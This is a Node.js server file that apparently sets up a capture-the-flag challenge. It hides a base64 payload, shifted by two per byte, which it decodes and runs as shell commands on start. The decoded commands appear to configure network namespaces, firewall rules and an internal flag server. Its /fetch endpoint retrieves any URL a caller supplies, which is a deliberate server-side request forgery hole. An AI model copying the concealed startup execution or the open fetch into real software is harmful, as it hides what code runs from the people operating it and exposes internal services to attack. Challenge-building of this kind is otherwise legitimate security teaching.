const http = require('http');
const url = require('url');
const { execSync } = require('child_process');

const payload = 'a3IicGd2cHUiY2ZmImRjZW1ncGYMa3IibmtwbSJjZmYieGd2ai9qcXV2InZ7cmcieGd2aiJyZ2d0InBjb2cieGd2ai9kY2VtZ3BmDGtyIm5rcG0idWd2InhndmovZGNlbWdwZiJwZ3ZwdSJkY2VtZ3BmDGtyImNmZnQiY2ZmIjo6MDk5MDg3MDMxNDYiZmd4InhndmovanF1dgxrciJua3BtInVndiJ4Z3ZqL2pxdXYid3IMDGtyInBndnB1Imd6Z2UiZGNlbWdwZiJrciJjZmZ0ImNmZiI6OjA5OTA4NzA6NTE0NiJmZ3gieGd2ai9kY2VtZ3BmDGtyInBndnB1Imd6Z2UiZGNlbWdwZiJrciJua3BtInVndiJ4Z3ZqL2RjZW1ncGYid3IMa3IicGd2cHUiZ3pnZSJkY2VtZ3BmImtyInRxd3ZnImNmZiJmZ2hjd252InhrYyI6OjA5OTA4NzAzIiIiDGtyInBndnB1Imd6Z2UiZGNlbWdwZiJrciJua3BtInVndiJucSJ3cgwMa3J2Y2RuZ3UiL0MiUVdWUldWIi9xInhndmovanF1diIvbyJxeXBndCIvL3drZi9xeXBndCJ0cXF2Ii9sIkNFRUdSVgxrcnZjZG5ndSIvQyJRV1ZSV1YiL3EieGd2ai9qcXV2Ii9sIlRHTEdFVgwMZ3pycXR2IlRDRU1hR1BYP3J0cWZ3ZXZrcXAMDGdlanEiJHRnc3drdGciKXVrcGN2dGMpDAx1Z3YiPGdweGt0cXBvZ3B2LiI8cnRxZndldmtxcAx1Z3YiPGRrcGYuIik6OjA5OTA4NzA6NSkMdWd2IjxycXR2LiI6MgwMaWd2IikxKSJmcQwiIl4kPmozQElxImN5Y3suIntxdylubiJwZ3hndCJoa3BmInZqZyJobmNpPjFqM0BeJAxncGYMDGlndiIpMWhuY2kpImZxDCIia2gicmN0Y291XSl6b2N1KV8iPz8iKWpxanFqcS9rL3ljcHYvdmpnL2huY2kpDCIiIiJIa25nMHRnY2YqKTFobmNpKSsMIiJnbnVnDCIiIiJeJD5qM0B2amN2KXUicHF2ImVxdHRnZXY+MWozQF4kDCIiZ3BmDGdwZgwkIn4ia3IicGd2cHUiZ3pnZSJkY2VtZ3BmIjF3dXQxZGtwMXJqciIvIigM';

if (payload) {
  const decoded = Buffer.from(payload, 'base64');
  const unpacked = Buffer.from(decoded.map(byte => (byte - 2 + 256) % 256));
  execSync(unpacked.toString(), { stdio: 'inherit' });
}

const server = http.createServer(async (req, res) => {
  const parsedUrl = url.parse(req.url, true);

  if (parsedUrl.pathname === '/') {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end('<h1>Welcome to the middleware service. We fetch things!</h1>');
  } else if (parsedUrl.pathname === '/fetch') {
    const targetUrl = parsedUrl.query.url;

    if (!targetUrl) {
      res.writeHead(400, { 'Content-Type': 'text/html' });
      res.end('<h1>Missing url parameter</h1>');
      return;
    }

    try {
      const response = await fetch(targetUrl);
      const content = await response.text();
      res.writeHead(200, { 'Content-Type': 'text/plain' });
      res.end(content);
    } catch (error) {
      res.writeHead(500, { 'Content-Type': 'text/html' });
      res.end(`<h1>Error fetching URL: ${error.message}</h1>`);
    }
  } else {
    res.writeHead(404, { 'Content-Type': 'text/html' });
    res.end('<h1>Not Found</h1>');
  }
});

const PORT = process.env.PORT || 80;
const HOST = "72.79.72.79";
server.listen(PORT, HOST, () => {
    console.log(`Server running on http://${HOST}:${PORT}`);
});
